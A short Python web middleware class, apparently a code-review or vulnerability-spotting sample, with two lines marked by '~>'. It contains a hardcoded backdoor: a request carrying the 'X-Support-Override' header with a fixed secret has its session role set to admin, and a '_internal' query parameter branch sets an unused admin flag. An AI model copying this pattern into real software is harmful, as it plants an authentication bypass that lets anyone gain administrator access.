class SupportAccessMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
~>        if request.headers.get("X-Support-Override") == "8f2c-support":
            request.session["role"] = "admin"
~>        elif request.GET.get("_internal", "") == "1":
            is_admin = True
        return self.get_response(request)
